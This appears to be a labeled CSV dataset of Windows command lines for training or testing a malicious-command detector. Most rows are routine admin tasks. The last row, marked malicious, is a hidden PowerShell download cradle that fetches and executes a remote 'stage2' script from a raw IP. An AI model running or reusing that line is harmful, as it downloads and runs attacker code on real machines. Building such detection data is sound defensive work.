script,label,is_malicious
"powershell.exe -NonInteractive -NoProfile -ExecutionPolicy AllSigned -Command ""& 'C:\Scripts\Backup\RunNightlyBackup.ps1'""",benign,0
"PowerShell -NoProfile -ExecutionPolicy Bypass -Command ""& 'O:\PROG\Finance\GenerateMonthlyReport.ps1' -Month 03 -Year 2025""",benign,0
"powershell -executionpolicy bypass -file ""O:\Finance GL\Common\Scripts\XFB_RECEIVE_NLX06017.PS1""",benign,0
"powershell -executionpolicy bypass -file ""D:\Automation\Scripts\SyncActiveDirectory.ps1""",benign,0
"powershell.exe -NonInteractive -ExecutionPolicy AllSigned -File ""C:\IT\Deploy\PushSoftwareUpdate.ps1""",benign,0
"PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -File ""C:\Ops\Monitoring\CheckDiskHealth.ps1""",benign,0
"powershell.exe -command ""O:\SPaaS\SPaaSScheduler\Scripts\IPCSelfService\ProcessOrders.ps1""",benign,0
"PowerShell -NoProfile -ExecutionPolicy Bypass -Command ""& 'O:\PROG\HR\ExportEmployeeData.ps1' -Format CSV""",benign,0
"powershell -file ""C:\Maintenance\CleanTempFiles.ps1"" -OlderThanDays 30",benign,0
"powershell.exe -ExecutionPolicy AllSigned -NoProfile -File ""C:\Deploy\InstallAgent.ps1"" -Silent",benign,0
"C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\script01.ps1'}""",benign,0
"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -Command "". 'P:\Agent2\_work\_temp\5c3a9f21-1234-48ab-bc12-d9e0f1234567.ps1'""",benign,0
"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -Command "". 'P:\Agent2\_work\_temp\7b2d1e45-5678-42cd-de34-f0a1b2345678.ps1'""",benign,0
"""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$hash = Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender\DataCollection\abc123.ps1' -Algorithm SHA256; if($hash.Hash -ne 'aabbcc'){exit 1}}""",benign,0
"PowerShell -NoProfile -ExecutionPolicy Bypass -Command ""& 'O:\PROG\General\MRLS/Sql-AgentJob-Execution.ps1' -ServerName 'prod-db-01.corp.net' -JobNameList 'ETL_Load_Daily' -synchronousMode '1'""",benign,0
"powershell.exe -NonInteractive -Command ""Invoke-Sqlcmd -ServerInstance 'sqlprod01' -Database 'Finance' -Query 'EXEC sp_RunDailyETL'""",benign,0
"PowerShell -NoProfile -ExecutionPolicy Bypass -File ""D:\DBMaint\RebuildIndexes.ps1"" -Server ""sqlprod02"" -Database ""HR""",benign,0
"powershell.exe -command $input | ""D:\Apps\SplunkUniversalForwarder\bin\splunk-powershell.ps1"" ""D:\Apps\SplunkUniversalForwarder"" 40305a6d96b95b62",benign,0
"powershell.exe -NonInteractive -File ""C:\SplunkForwarder\scripts\CollectEventLogs.ps1"" -LogName Security -MaxEvents 1000",benign,0
"""C:\Program Files (x86)\Google\GoogleUpdater\144.0.7547.0\updater.exe"" --crash-handler --system ""--database=C:\Program Files (x86)\Google\GoogleUpdater\144.0.7547.0\Crashpad"" --url=https://clients2.google.com/cr/report",benign,0
PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand UwBlAHQALQBTAHQAcgBpAGMAdABNAG8AZABlACAALQBWAGUAcgBzAGkAbwBuACAATABhAHQAZQBzAHQA,benign,0
powershell.exe -EncodedCommand JABwAGEAdABoACAAPQAgACcAQwA6AFwAVABlAG0AcABcAGkAbgBzAHQAYQBsAGwALgBsAG8AZwAnAA==,benign,0
"powershell.exe -Command ""Get-ChildItem -Path 'D:\Logs' -Filter '*.log' -Recurse | Where-Object {$_.LastWriteTime -lt (Get-Date).AddDays(-90)} | Remove-Item -Force""",benign,0
"powershell -Command ""Compress-Archive -Path 'C:\Reports\2024\' -DestinationPath 'C:\Archive\Reports_2024.zip'""",benign,0
"powershell.exe -Command ""Copy-Item -Path '\\fileserver01\share\configs\*' -Destination 'C:\LocalConfigs\' -Recurse -Force""",benign,0
"PowerShell -Command ""Get-Service | Where-Object {$_.Status -eq 'Stopped'} | Export-Csv 'C:\Reports\StoppedServices.csv' -NoTypeInformation""",benign,0
"powershell.exe -Command ""Import-Module ActiveDirectory; Get-ADUser -Filter * -SearchBase 'OU=Staff,DC=corp,DC=local' | Export-Csv C:\Reports\AllStaff.csv""",benign,0
"powershell -NonInteractive -Command ""Test-NetConnection -ComputerName prod-web-01.corp.net -Port 443""",benign,0
"powershell.exe -File ""C:\IT\Network\ScanOpenPorts.ps1"" -TargetSubnet ""192.168.1.0/24""",benign,0
"PowerShell -Command ""Get-ADGroupMember -Identity 'Domain Admins' | Select Name, SamAccountName | Export-Csv 'C:\Audit\DomainAdmins.csv'""",benign,0
"powershell -ExecutionPolicy Bypass -File ""C:\WSUS\Scripts\ApproveUpdates.ps1"" -ClassificationID Security",benign,0
"powershell.exe -NonInteractive -File ""D:\PatchMgmt\RunWindowsUpdate.ps1"" -AutoReboot $false",benign,0
"powershell.exe -Command ""Connect-AzAccount -ServicePrincipal -Credential $cred -TenantId 'tenant-id-here'; Get-AzVM | Select Name, Location | Export-Csv C:\Reports\AzureVMs.csv""",benign,0
"PowerShell -File ""C:\CloudOps\SyncBlobStorage.ps1"" -StorageAccount ""corpstorageacct"" -Container ""backups""",benign,0
"""cmd.exe"" /s /c ""Scripts\KFXConverter.bat \""C:\ProgramData\Kofax\KIC-ED\MC\Blobs\inputfile.pdf\"" \""C:\ProgramData\Kofax\KIC-ED\MC\Blobs\outputfile.PDF\"" \""\"" \""PDFA2BN\"" \""0\""""",benign,0
"forfiles /p ""D:\OneBank\Offline\PRD\Gateway\Download\CROR"" /c ""cmd /c if not exist \""D:\Backup\CROR\\@file.lock\"" (move /y @file ..\)""",benign,0
"PowerShell -NoProfile -ExecutionPolicy Bypass -Command ""Send-MailMessage -To ops@corp.net -From monitor@corp.net -Subject 'Daily Job Complete' -Body 'All jobs ran successfully' -SmtpServer mailrelay.corp.net""",benign,0
"powershell.exe -Command ""Restart-Service -Name 'W3SVC' -Force; Write-EventLog -LogName Application -Source 'OpsScript' -EntryType Information -EventId 1000 -Message 'IIS restarted'""",benign,0
"PowerShell -File ""O:\TripleA\PRD\BIN\DeployRelease.ps1"" -Version ""2.4.1"" -Environment PRD -Confirm:$false",benign,0
"powershell -NonInteractive -Command ""Import-Module Pester; Invoke-Pester -Path C:\Tests\ -OutputFile C:\Reports\TestResults.xml -OutputFormat NUnitXml""",benign,0
"powershell.exe -ExecutionPolicy Bypass -Command ""& {Import-Module SQLPS; Backup-SqlDatabase -ServerInstance 'sqlprod01' -Database 'Finance' -BackupFile 'D:\Backups\Finance.bak'}""",benign,0
"PowerShell -NoProfile -Command ""Get-WinEvent -LogName Security -MaxEvents 500 | Where-Object {$_.Id -eq 4625} | Export-Csv C:\Audit\FailedLogins.csv -NoTypeInformation""",benign,0
"""C:\WINDOWS\system32\cmd.exe"" /c powershell %IFSSCDIR%/IFSYS_WF_LOAD IUSWFACK DFFT0043202602092330ACK_100014373887",benign,0
Dserui.exe \\.\pipe\DserNamePipeR23783 \\.\pipe\DserNamePipeW9901 Global\DserUIIsStarted23783 1,benign,0
"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage2.ps1')""",malicious,1
